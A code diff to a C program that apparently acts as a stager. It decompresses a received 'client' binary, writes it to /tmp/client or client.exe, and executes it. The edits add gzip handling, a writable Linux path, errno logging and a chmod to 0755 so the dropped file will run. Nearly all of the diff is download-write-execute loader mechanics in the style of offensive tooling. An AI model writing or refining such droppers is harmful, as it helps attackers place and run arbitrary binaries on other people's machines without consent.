@@ -29,6 +29,7 @@
 #include <string.h>
 #include <stdint.h>
 #include <time.h>
+#include <errno.h>
 
 #ifdef _WIN32
     #include <winsock2.h>
@@ -303,7 +304,8 @@ static size_t decompress_data(const unsigned char *compressed, size_t comp_size,
     strm.next_out = *decompressed;
     strm.avail_out = decomp_size;
     
-    if (inflateInit(&strm) != Z_OK) {
+    // Use inflateInit2 with 16+MAX_WBITS to handle gzip format
+    if (inflateInit2(&strm, 16 + MAX_WBITS) != Z_OK) {
         free(*decompressed);
         return 0;
     }
@@ -938,18 +940,18 @@ int main(int argc, char *argv[]) {
     
     DEBUG_PRINT("[*] Client binary size: %zu bytes\n", client_size);
     
-    // Write client to disk
+    // Write client to disk (use /tmp on Linux for write permissions)
 #ifdef _WIN32
     const char *client_filename = "client.exe";
 #else
-    const char *client_filename = "client";
+    const char *client_filename = "/tmp/client";
 #endif
     
     DEBUG_PRINT("[*] Writing client to %s\n", client_filename);
     
     FILE *fp = fopen(client_filename, "wb");
     if (!fp) {
-    DEBUG_PRINT("[!] Failed to open file for writing\n");
+    DEBUG_PRINT("[!] Failed to open file for writing (errno: %d)\n", errno);
         free(client_binary);
         goto cleanup;
     }
@@ -957,6 +959,11 @@ int main(int argc, char *argv[]) {
     fwrite(client_binary, 1, client_size, fp);
     fclose(fp);
     free(client_binary);
+    
+#ifndef _WIN32
+    // Make the client executable on Linux
+    chmod(client_filename, 0755);
+#endif
     
     DEBUG_PRINT("[*] Executing client...\n");
     
